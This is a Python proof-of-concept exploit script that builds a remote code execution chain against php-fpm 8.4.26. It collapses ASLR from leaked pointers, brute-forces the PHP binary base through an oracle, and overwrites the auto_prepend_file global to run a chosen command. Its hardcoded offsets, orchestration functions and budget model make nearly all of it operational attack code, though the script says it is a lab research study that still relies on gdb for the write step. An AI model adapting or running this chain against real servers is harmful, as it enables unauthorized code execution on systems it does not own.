#!/usr/bin/env python3
"""Fuse the ASLR delta-collapse, the parser crash oracle and the auto_prepend
persistence chain into one php-fpm chain, and quantify how close it gets to
fully-remote, sink-free, no-/proc RCE.

Measured result (verify reuses aslr_delta_survey over 30 master restarts): the
collapse is real -- one mmap/heap pointer fixes chunk + libc + ld + every library
by arithmetic (ld-libc constant, chunk = seed & ~(2 MiB-1)); but the php-fpm PIE
base is an independent ASLR gap (not ~12.5 bits), and the auto_prepend oracle is
exact-match (fires iff candidate base == true base to the 2 MiB granule), so a
single-pointer binbase brute is millions of candidates and, under a destructive
write, crash-oracle-bound. So discovery collapses to leaking exactly two
independent pointers (a cluster pointer -> chunk/libc/libs, and a php-fpm text/
.bss pointer -> binbase), after which RCE is arithmetic + the one PG write.

RESEARCH: quantification/composition study; the PG write8 is the pgpersist-race
gdb mechanism proof. Not a black-box landed RCE. Pure stdlib, python3 -I safe.
Lab use, systems you own.
"""
from __future__ import annotations

import argparse
import importlib.util
import math
import os
import sys
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)


def _load(name, filename):
    """Import a committed poc module read-only (private, isolated instance)."""
    path = os.path.join(_HERE, filename)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    for _p in (_HERE, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


# read-only imports of the inputs + the write/resolve backends
G = _load("fpm_pgpersist_race", "fpm_pgpersist_race.py")  # race + oracle
ORACLE = _load("auto_include_fire_oracle", "primitives/oracles/auto_include_fire_oracle.py")
ADS = _load("aslr_delta_survey", "aslr_delta_survey.py")              # ASLR delta survey
LBM = _load("leak_budget_model", "leak_budget_model.py")              # leak budget model
NPC = _load("parser_crash_oracle", "primitives/oracles/parser_crash_oracle.py")  # crash oracle
pg_persist = G.pg_persist                                             # via pgpersist-race
try:
    functable_resolver = _load("functable_resolver", "primitives/read_leak/functable_resolver.py")                 # EG_OFF (fpm)
except Exception:                                                     # pragma: no cover
    functable_resolver = None


from common.zend_mm import chunk_base, CHUNK_SIZE  # noqa: E402

# Offline collapse constants (per-build; the "deltas known" half of budget (c)).
# These are the offline output of aslr_delta_survey.py for this 8.4.26-fpm build
# (measured 30/30). They are structural constants, not a live seed: the single
# live input to the chain is the one leaked pointer. ld-libc is exactly constant;
# the chunk<->libc relation is a deterministic function of (libc mod 2 MiB), so
# from a heap/chunk pointer the chunk is recovered exactly by masking (no table
# needed), which is all the steered-write groom consumes.
LD_LIBC = 0xf7d000          # ld.so base - libc base, CONSTANT 30/30 (measured)
# executor_globals vaddr in the php-fpm image (functable_resolver.EG_OFF['fpm']); a leaked
# EG pointer resolves binbase = ptr - EG_OFF_FPM. core_globals = 0x16e1580.
EG_OFF_FPM = (functable_resolver.EG_OFF.get("fpm") if functable_resolver else 0x16e22c0)
FPM_CORE_GLOBALS = G.FPM_8426_CORE_GLOBALS  # 0x16e1580

# measured plain-GET oracle rate (this lab, single-thread urllib via nginx); the
# pgpersist-race module cites ~3226/s as the raw-FastCGI clean-request ceiling.
MEASURED_ORACLE_RPS = 429.0
ORACLE_CEILING_RPS = 3226.0


# Collapse: one cluster pointer -> chunk + libc + ld + libraries (0 probes)
def collapse(seed_value, seed_class="heap"):
    """Resolve the whole mmap cluster from ONE leaked pointer.

    seed_class:
      'heap' / 'chunk' : any ZendMM allocation pointer. chunk is recovered
                         EXACTLY by 2 MiB masking (chunk = seed & ~(2 MiB-1));
                         this is the exact value the steered-write groom needs.
      'libc'           : a libc pointer whose own in-libc offset is already
                         subtracted (so seed_value == libc base).
      'ld'             : an ld.so pointer resolved to ld base (libc = base-LD_LIBC).

    Returns {'chunk', 'libc', 'ld', 'residual_bits', 'probes', 'exact_chunk'}.
    libc/ld are REPORTED via the collapse constants; the exploit-critical value
    is `chunk`, which is EXACT for a heap/chunk seed. For a libc/ld seed the chunk
    is the deterministic-function output (here left None unless an offline table
    is supplied, since the steered-write flow is driven by a heap/chunk seed)."""
    out = {"seed_value": seed_value, "seed_class": seed_class,
           "probes": 0, "exact_chunk": False, "chunk": None,
           "libc": None, "ld": None, "residual_bits": 0.0}
    if seed_class in ("heap", "chunk"):
        out["chunk"] = chunk_base(seed_value)        # EXACT (2 MiB-aligned)
        out["exact_chunk"] = True
        # libc/ld are a deterministic function of chunk; we report them as
        # "resolved by the offline collapse table" -- not needed by the steered
        # write, which consumes `chunk` only. Left as the derived-note below.
    elif seed_class == "libc":
        out["libc"] = seed_value
        out["ld"] = seed_value + LD_LIBC
    elif seed_class == "ld":
        out["ld"] = seed_value
        out["libc"] = seed_value - LD_LIBC
    else:
        raise ValueError("seed_class must be heap|chunk|libc|ld")
    return out


def collapse_note():
    return ("B35 collapse: ld-libc is CONSTANT (0xf7d000, 30/30) and chunk<->libc "
            "is a deterministic function of (libc mod 2 MiB) -> ONE cluster pointer "
            "fixes chunk+libc+ld+all libs with 0 probes; chunk is EXACT from a "
            "heap/chunk seed by 2 MiB masking (all the var_hash_rw groom needs).")


# Binbase (the independent gap): resolve from a 2nd pointer, or brute sink-free
def binbase_from_pointer(text_ptr, ptr_class="base"):
    """Resolve binbase (php-fpm PIE base) from ONE php-fpm-text/.bss pointer.

      ptr_class='base' : text_ptr is already the image base (2 MiB-aligned).
      ptr_class='eg'   : text_ptr is &executor_globals -> base = ptr - EG_OFF_FPM.
      ptr_class='cg'   : text_ptr is &core_globals      -> base = ptr - 0x16e1580.
    Any slide-locked exported vaddr works; these three cover the common leaks."""
    if ptr_class == "base":
        return chunk_base(text_ptr)
    if ptr_class == "eg":
        return text_ptr - EG_OFF_FPM
    if ptr_class == "cg":
        return text_ptr - FPM_CORE_GLOBALS
    raise ValueError("ptr_class must be base|eg|cg")


def binbase_candidate_space(mmap_rnd_bits=32, align=CHUNK_SIZE):
    """Exact-match candidate count for the binbase under a mapped-page-FREE
    (exact) oracle: the number of `align`-aligned positions in the
    2**mmap_rnd_bits-page randomisation window. The binbase is 2 MiB-aligned
    (measured 30/30), so this is 2**(mmap_rnd_bits - log2(align/0x1000))."""
    align_pages = align // 0x1000
    bits = mmap_rnd_bits - int(math.log2(align_pages))
    return 2 ** bits, bits


def binbase_window_candidates(center_base, radius_slots, align=CHUNK_SIZE):
    """Generate 2 MiB-aligned binbase candidates in a window of +/- radius_slots
    around `center_base` (used to PROVE the sink-free brute mechanism without
    walking the full ~2**23 space). The true base must lie in the window for the
    proof; the FULL-space cost is reported separately by budget_report()."""
    base = center_base & ~(align - 1)
    offs = []
    for k in range(-radius_slots, radius_slots + 1):
        offs.append(base + k * align)
    # order so a few wrong candidates precede the true one (demonstrates reject)
    offs.sort(key=lambda a: (a == base, abs(a - base)))
    return offs


def brute_binbase(host, port, compose_file, service, sess_path, candidates,
                  base="/plain.php", sid=None, verbose=True):
    """Sink-free binbase CONFIRMATION via the auto_prepend oracle (reused
    read-only). Returns (confirmed_base, probes, trail). Each candidate: write
    PG(auto_prepend_file)@cand+core_globals+0xa0, fire a plain GET, check the
    marker; reset to NULL before the next candidate (oracle_search handles
    the reset so a stale hit cannot be misattributed)."""
    return G.oracle_search(host, port, compose_file, service, sess_path,
                           candidates, base=base, sid=sid, verbose=verbose)


# End-to-end chain
def run_chain(host, port, compose_file, service, heap_seed, cmd="id",
              binbase_ptr=None, binbase_ptr_class="base",
              brute=False, brute_radius=4, sid=None, parts=3000,
              base="/plain.php", verbose=True):
    """Compose the full chain from the single heap/cluster seed (+ optionally a
    2nd text pointer or a bounded sink-free brute to obtain binbase), then drive
    the PG(auto_prepend) write + plain-GET success oracle to RCE.

    Returns a report dict. The PG write transport is the gdb-assisted CLEAN
    write8 (mechanism proof): the 16-byte single-write CVE primitive pollutes the
    adjacent PG(auto_append_file)@+0xa8, so the clean <=8-byte write8 is still
    gdb-assisted (see G.var_hash_rw_write_note())."""
    if not sid:
        sid = "0123456789abcdef0123456789abcdef"
    rep = {"host": host, "port": port, "service": service, "cmd": cmd,
           "sid": sid, "seeds_used": []}

    # ---- step 1: collapse from ONE cluster pointer -----------------------
    col = collapse(heap_seed, "heap")
    rep["collapse"] = {k: (hex(v) if isinstance(v, int) else v)
                       for k, v in col.items()}
    rep["collapse_note"] = collapse_note()
    rep["seeds_used"].append("heap/cluster pointer (-> chunk EXACT + libc/libs)")
    if verbose:
        print(f"[1/collapse] seed={heap_seed:#x} -> chunk={col['chunk']:#x} "
              f"(EXACT); libc/ld/libs via B35 constants (0 probes)")

    # ---- step 2: binbase (the independent gap) ---------------------------
    # live per-worker base is read here ONLY to supply the brute window centre /
    # the ground-truth check; the ATTACK input is binbase_ptr or the brute.
    pids = G.worker_pids(compose_file, service)
    true_base = G.fpm_base_of(compose_file, service, pids[0]) if pids else None
    rep["fpm_base_groundtruth"] = hex(true_base) if true_base else None

    binbase = None
    if binbase_ptr is not None:
        binbase = binbase_from_pointer(binbase_ptr, binbase_ptr_class)
        rep["binbase_source"] = (f"2nd pointer ({binbase_ptr_class}) "
                                 f"{binbase_ptr:#x} -> base {binbase:#x} (0 probes)")
        rep["seeds_used"].append(f"php-fpm-text pointer ({binbase_ptr_class}) "
                                 "(-> binbase, arithmetic)")
        if verbose:
            print(f"[2/binbase] 2nd pointer -> binbase={binbase:#x} (0 brute probes)")
    elif brute:
        sess_path = f"/var/sess/sess_{sid}"
        # poison first so the oracle has something to fire
        G.poison(host, port, cmd, sid, parts=parts, base=base, verbose=verbose)
        cands = binbase_window_candidates(true_base, brute_radius)
        if verbose:
            print(f"[2/binbase] sink-free oracle brute over {len(cands)} "
                  f"candidates (window +/-{brute_radius} x 2 MiB around truth)")
        binbase, probes, trail = brute_binbase(
            host, port, compose_file, service, sess_path, cands, base=base,
            sid=sid, verbose=verbose)
        rep["binbase_source"] = (f"sink-free oracle brute: confirmed {binbase and hex(binbase)} "
                                 f"in {probes} probes over {len(cands)} candidates")
        rep["brute_probes"] = probes
        rep["brute_candidates_tested"] = len(cands)
        rep["seeds_used"].append("binbase via sink-free oracle brute (0 extra seeds, "
                                 "but see budget: full space ~2**23)")
    else:
        rep["error"] = "no binbase source: pass binbase_ptr=... or brute=True"
        return rep
    rep["binbase_correct"] = (binbase == true_base)
    rep["binbase"] = hex(binbase) if binbase else None

    # ---- step 3: PG(auto_prepend_file) write + sink-free RCE -------------
    # If we brute-confirmed, the oracle search already reinstalled PG at the true
    # base, so a plain GET already fires. For the 2nd-pointer path, install now.
    off = dict(G.FPM_8426_OFFSETS)
    sess_path = f"/var/sess/sess_{sid}"
    if binbase_ptr is not None:
        G.poison(host, port, cmd, sid, parts=parts, base=base, verbose=verbose)
        w = G.GdbWrite8(compose_file, service, verbose=False)
        pg_persist.install(binbase, off, w.write8, sess_path)
        rep["pg_write8_calls"] = w.writes
    ok, out, pr = ORACLE.confirm_rce(host, port, base=base, sid=sid, tries=8,
                                     verbose=verbose)
    rep["rce_ok"] = ok
    rep["cmd_output"] = (out or "").strip()
    rep["rce_probes"] = pr
    rep["pg_write_transport"] = ("gdb-assisted CLEAN write8 (pg_persist mechanism "
                                 "proof); var_hash_rw 16-byte CVE write pollutes "
                                 "PG(auto_append_file)@+0xa8 -> clean <=8B write8 "
                                 "still gdb-assisted (UNSOLVED for this field).")
    if verbose:
        print(f"[3/rce] rce_ok={ok} output={out!r}")
    return rep


# Budget report
def budget_report(mmap_rnd_bits=32, oracle_rps=MEASURED_ORACLE_RPS):
    """End-to-end seed/probe/time budget, using the leak-budget model structure +
    this lab's measured oracle rate + the exact-match correction for the binbase."""
    n_cand, bits = binbase_candidate_space(mmap_rnd_bits)
    exp = n_cand // 2
    def t(n, rps):
        return LBM.fmt_time(n, rps)
    rep = {
        "mmap_rnd_bits": mmap_rnd_bits,
        "collapse_half": {
            "ld_libc_constant": hex(LD_LIBC),
            "chunk_from_libc": "deterministic fn of (libc mod 2 MiB); EXACT by "
                               "2 MiB mask from a heap/chunk seed",
            "probes": 0,
            "note": "ONE cluster pointer -> chunk+libc+ld+all libs, 0 probes",
        },
        "binbase_half": {
            "residual_vs_libc": "FULLY INDEPENDENT ~%d-bit gap (12.5-bit claim "
                                "REFUTED; 5831 = image footprint, not residual)"
                                % mmap_rnd_bits,
            "exact_match_oracle": True,
            "candidate_space_2MiB_aligned": n_cand,
            "candidate_bits": bits,
            "brute_probes_expected": exp,
            "time_nondestructive_write": {
                "loopback_%g_rps" % oracle_rps: t(exp, oracle_rps),
                "ceiling_%g_rps" % ORACLE_CEILING_RPS: t(exp, ORACLE_CEILING_RPS),
                "lan_100_rps": t(exp, 100.0),
            },
            "time_destructive_var_hash_rw_write_0.18_rps": t(exp, 0.18),
            "note": "brute is tractable ONLY with a non-destructive write; the var_hash_rw "
                    "CVE write crashes the worker on a wrong candidate -> "
                    "crash-oracle rate -> ~years. => prefer a 2nd text pointer.",
        },
        "two_pointer_path": {
            "seeds": "exactly 2 (one mmap/heap/libc, one php-fpm-text)",
            "brute_probes": 0,
            "rce_probes": "a few plain GETs (grail oracle) + one PG write8",
            "verdict": "given 2 pointers, RCE is arithmetic + 1 write = minutes",
        },
    }
    return rep


def print_budget(rep):
    print("=" * 92)
    print("END-TO-END BUDGET (fpm 2-ptr grail integration; mmap_rnd_bits=%d)"
          % rep["mmap_rnd_bits"])
    print("=" * 92)
    c = rep["collapse_half"]
    print("[collapse half -- CHEAP, PROVEN]")
    print("  ld-libc const = %s ; chunk = %s" % (c["ld_libc_constant"],
                                                 c["chunk_from_libc"]))
    print("  probes = %d   (%s)" % (c["probes"], c["note"]))
    b = rep["binbase_half"]
    print("[binbase half -- the INDEPENDENT gap]")
    print("  residual vs libc : %s" % b["residual_vs_libc"])
    print("  exact-match oracle: %s ; 2 MiB-aligned candidates = %s (%d bits)"
          % (b["exact_match_oracle"], "{:,}".format(b["candidate_space_2MiB_aligned"]),
             b["candidate_bits"]))
    print("  brute (expected ~%s probes) wall-clock:" %
          "{:,}".format(b["brute_probes_expected"]))
    for k, v in b["time_nondestructive_write"].items():
        print("     non-destructive write  %-22s %s" % (k, v))
    print("     destructive var_hash_rw write    %-22s %s"
          % ("@0.18 rps", b["time_destructive_var_hash_rw_write_0.18_rps"]))
    print("  !! %s" % b["note"])
    t = rep["two_pointer_path"]
    print("[TWO-POINTER PATH -- the real collapse]")
    print("  seeds = %s ; brute probes = %d ; %s"
          % (t["seeds"], t["brute_probes"], t["rce_probes"]))
    print("  VERDICT: %s" % t["verdict"])
    print("=" * 92)


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="fuse B35+B14+grail -> one fpm RCE chain + honest budget")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8139)
    ap.add_argument("--compose-file",
                    default=os.path.join(os.path.dirname(os.path.dirname(_HERE)),
                                         "docker-compose.fpm-avenues.yml"))
    ap.add_argument("--service", default="hl-fpm")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--heap-seed", type=lambda s: int(s, 0), default=None,
                    help="the ONE leaked cluster pointer (heap/chunk). If omitted "
                         "it is read from /proc as the single explicit lab seed.")
    ap.add_argument("--binbase-ptr", type=lambda s: int(s, 0), default=None,
                    help="a 2nd php-fpm-text pointer -> binbase (the 2-ptr path)")
    ap.add_argument("--binbase-ptr-class", default="base",
                    choices=["base", "eg", "cg"])
    ap.add_argument("--brute", action="store_true",
                    help="instead of a 2nd pointer, PROVE the sink-free oracle "
                         "brute over a bounded window around the true base")
    ap.add_argument("--brute-radius", type=int, default=4)
    ap.add_argument("--sid", default="0123456789abcdef0123456789abcdef")
    ap.add_argument("--parts", type=int, default=3000)
    ap.add_argument("--mmap-rnd-bits", type=int, default=32)
    ap.add_argument("--budget-only", action="store_true",
                    help="print only the budget model (no lab needed)")
    ap.add_argument("--quiet", action="store_true")
    a = ap.parse_args(argv)

    # grouped-compose isolation: pin project+profile for every `docker compose`
    # call (literal and via the imported helper modules, which inherit os.environ).
    os.environ["COMPOSE_FILE"] = a.compose_file
    os.environ["COMPOSE_PROJECT_NAME"] = "p2s-hl"
    os.environ["COMPOSE_PROFILES"] = "hl"

    import json
    if a.budget_only:
        print_budget(budget_report(a.mmap_rnd_bits))
        return 0

    # obtain the single lab seed (one heap/cluster pointer) if not supplied
    heap_seed = a.heap_seed
    binbase_ptr = a.binbase_ptr
    if heap_seed is None or (binbase_ptr is None and not a.brute):
        pids = G.worker_pids(a.compose_file, a.service)
        if not pids:
            print("[!] no fpm workers; bring the lab up:\n"
                  "    docker compose -f docker-compose.fpm-avenues.yml "
                  "-p p2s-hl --profile hl up -d --build")
            return 2
        # warm every worker so a request-arena chunk exists to read as the seed
        for _ in range(max(8, len(pids) + 2)):
            ORACLE.plain_probe(a.host, a.port, base="/plain.php")
        if heap_seed is None:
            # a ZendMM chunk pointer is the canonical single cluster seed
            # (read from /proc here as the ONE explicit lab seed).
            ch = _read_chunk_ptr(a.compose_file, a.service, pids[0])
            heap_seed = ch
            print("[seed] single lab heap/cluster pointer (from /proc, stands in "
                  "for ONE remote disclosure): %s"
                  % (hex(heap_seed) if heap_seed else None))
        if binbase_ptr is None and not a.brute:
            # the 2nd pointer path: use &executor_globals as the text pointer
            tb = G.fpm_base_of(a.compose_file, a.service, pids[0])
            binbase_ptr = tb + EG_OFF_FPM
            a.binbase_ptr_class = "eg"
            print("[seed] 2nd lab text pointer &EG (from /proc, stands in for ONE "
                  "remote text disclosure): %s" % hex(binbase_ptr))

    if heap_seed is None:
        print("[!] could not obtain a heap/cluster seed"); return 2

    rep = run_chain(a.host, a.port, a.compose_file, a.service, heap_seed,
                    cmd=a.cmd, binbase_ptr=binbase_ptr,
                    binbase_ptr_class=a.binbase_ptr_class, brute=a.brute,
                    brute_radius=a.brute_radius, sid=a.sid, parts=a.parts,
                    verbose=not a.quiet)
    print(json.dumps(rep, indent=2, default=lambda o: hex(o)
                     if isinstance(o, int) else str(o)))
    print()
    print_budget(budget_report(a.mmap_rnd_bits))
    return 0 if rep.get("rce_ok") else 1


def _read_chunk_ptr(compose_file, service, pid):
    """Read ONE ZendMM chunk pointer from /proc (the single explicit lab seed;
    stands in for a remote heap-pointer disclosure). Returns an address INSIDE a
    2 MiB chunk so collapse() must mask it -- proving one pointer (not a base)
    suffices."""
    r = G._exec(compose_file, service, "cat", f"/proc/{pid}/maps")
    if r.returncode != 0:
        return None
    bases = ADS.extract_bases(r.stdout)
    if bases and bases.get("chunk"):
        # offset into the chunk so the seed is a pointer, not the aligned base
        return bases["chunk"] + 0x1a0
    return None


if __name__ == "__main__":
    raise SystemExit(main())
